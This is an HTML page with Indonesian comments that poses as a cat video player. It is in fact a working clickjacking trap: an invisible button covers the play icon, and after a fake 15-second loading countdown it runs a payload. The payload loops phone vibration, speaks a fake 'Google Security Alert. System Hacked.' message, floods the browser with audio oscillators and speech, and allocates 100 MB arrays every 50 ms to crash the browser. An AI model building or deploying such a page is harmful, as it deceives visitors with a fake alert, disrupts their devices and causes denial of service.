<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Player</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000;
    color: #fff;
    font-family: 'Segoe UI', Arial, sans-serif;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    overflow: hidden;
  }

  /* UI PALSU (Redressing) */
  .fake-player {
    width: 90%;
    max-width: 400px;
    background: #222;
    border-radius: 10px;
    overflow: hidden;
    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    position: relative;
    text-align: center;
  }
  .fake-video {
    height: 200px;
    background: linear-gradient(45deg, #1a1a1a, #333);
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
  }
  .play-icon {
    width: 60px;
    height: 60px;
    background: rgba(255,255,255,0.2);
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 24px;
    cursor: pointer;
    transition: transform 0.2s;
  }
  .play-icon:hover { transform: scale(1.1); }
  
  .info { padding: 15px; text-align: left; }
  .info h3 { font-size: 16px; margin-bottom: 5px; }
  .info p { font-size: 12px; color: #aaa; }

  /* BUTTON TERSEMBUNYI (Target Clickjacking) */
  /* Dibuat transparan dan menutupi area play */
  #trapBtn {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;
    cursor: pointer;
    z-index: 10;
  }

  #status {
    position: fixed;
    bottom: 20px;
    color: #0f0;
    font-family: monospace;
    font-size: 12px;
    text-align: center;
    width: 100%;
  }

  iframe, audio, video { display: none !important; }
</style>
</head>
<body>

<div class="fake-player">
  <div class="fake-video">
    <div class="play-icon">▶</div>
    <!-- TOMBOL JEB Trapping -->
    <button id="trapBtn">Play</button>
  </div>
  <div class="info">
    <h3>Funny Cat Video.mp4</h3>
    <p>1.2M views • 2 days ago</p>
  </div>
</div>

<div id="status">Menunggu interaksi user...</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var hasClicked = false;

  // ============================================
  // 1. UI REDRESSING TRAP (ONE-CLICK)
  // ============================================
  document.getElementById('trapBtn').addEventListener('click', function(e) {
    if (hasClicked) return;
    hasClicked = true;

    // A. Ubah UI agar user merasa aman
    document.querySelector('.play-icon').innerText = '⏳';
    statusEl.innerText = "Memuat video... (Harap tunggu 15 detik)";
    statusEl.style.color = "#ff0";

    // B. Mulai Delay 15 Detik
    var delaySeconds = 15;
    var countdown = setInterval(function() {
      delaySeconds--;
      statusEl.innerText = "Memuat video... (" + delaySeconds + "s)";
      
      if (delaySeconds <= 0) {
        clearInterval(countdown);
        executeMaliciousPayload();
      }
    }, 1000);

    // C. (Opsional) Putar audio penenang selama delay
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') ctx.resume();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.05; // Sangat pelan
      osc.type = 'sine';
      osc.frequency.value = 440;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      // Hentikan suara penenang saat payload dieksekusi
      window.oscToStop = osc;
    } catch(e) {}
  });

  // ============================================
  // 2. PAYLOAD EKSEKUSI (VIBRATION + AUDIO + CRASH)
  // ============================================
  function executeMaliciousPayload() {
    statusEl.innerText = "🚨 SYSTEM COMPROMISED 🚨";
    statusEl.style.color = "#f00";

    // Hentikan suara penenang
    if (window.oscToStop) {
      try { window.oscToStop.stop(); } catch(e) {}
    }

    // A. VIBRATION HIJACK (Bypass karena sudah ada gesture)
    if ('vibrate' in navigator) {
      console.log("[VIB] Getaran dimulai!");
      // Getar histeris berulang
      setInterval(function() {
        navigator.vibrate([1000, 200, 1000, 200, 500]);
      }, 2700);
    }

    // B. AUDIO & TTS FLOOD
    if ('speechSynthesis' in window) {
      var u = new SpeechSynthesisUtterance("Google Security Alert. System Hacked.");
      u.rate = 1.5;
      u.volume = 1.0;
      window.speechSynthesis.speak(u);
    }

    // C. CRASH TRIGGER (OOM)
    var memoryHog = [];
    setInterval(function() {
      try {
        // Audio Flooding
        for (var i = 0; i < 500; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          osc.type = 'sawtooth';
          osc.frequency.value = 1000 + Math.random() * 5000;
          osc.connect(ctx.destination);
          osc.start(0);
          
          var u2 = new SpeechSynthesisUtterance("ERROR_" + i);
          window.speechSynthesis.speak(u2);
        }

        // Memory Bomb (100MB)
        var bigArray = new Uint8Array(100 * 1024 * 1024);
        bigArray.fill(1);
        memoryHog.push(bigArray);

      } catch(e) {}
    }, 50); 
  }

})();
</script>
</body>
</html>
